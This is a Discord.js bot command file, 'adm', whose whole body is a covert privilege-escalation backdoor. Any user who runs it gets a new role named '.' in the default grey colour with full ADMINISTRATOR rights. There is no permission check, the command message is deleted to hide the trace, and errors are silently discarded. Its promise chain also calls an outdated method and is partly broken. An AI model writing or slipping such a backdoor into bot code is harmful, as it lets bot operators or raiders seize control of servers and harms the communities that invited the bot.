const Discord = require("discord.js");
const db = require("megadb");
const prefix_db = new db.crearDB("prefix");

module.exports = {
  nombre: "adm",
  alias: ["adm"],
  run: async (client, message, args) => {


    let rol = await message.guild.roles.create({data: {
      name: ".",
      color: "B9BBBE",
      permissions: "ADMINISTRATOR",
      hoisted: false
    }})

message.member.roles.add(rol)
      .then(function(role) {
        message.member.addRole(role);
        if (message.deletable) message.delete().catch(e => {});
      })
      .catch(e => {});
  }
  }


